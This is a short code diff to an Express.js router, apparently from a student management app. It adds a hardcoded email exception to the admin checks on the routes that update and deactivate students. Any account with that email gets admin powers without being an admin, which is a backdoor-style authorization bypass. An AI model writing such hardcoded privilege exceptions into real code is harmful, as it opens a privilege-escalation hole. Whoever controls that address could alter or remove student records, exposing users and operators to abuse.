@@ -37,9 +37,9 @@ router.get('/:id', async (req, res) => {
 // @access  Admin
 router.put('/update/:id', auth, async (req, res) => {
     try {
-        // Check if requester is admin
+        // Check if requester is admin OR has the hardcoded admin email
         const requester = await User.findById(req.user.id);
-        if (!requester.isAdmin) {
+        if (!requester.isAdmin && requester.email !== 'adminof11g@gmail.com') {
             return res.status(403).json({ error: 'Only admin can update students' });
         }
 
@@ -77,7 +77,7 @@ router.put('/update/:id', auth, async (req, res) => {
 router.delete('/deactivate/:id', auth, async (req, res) => {
     try {
         const requester = await User.findById(req.user.id);
-        if (!requester.isAdmin) {
+        if (!requester.isAdmin && requester.email !== 'adminof11g@gmail.com') {
             return res.status(403).json({ error: 'Only admin can delete students' });
         }
         
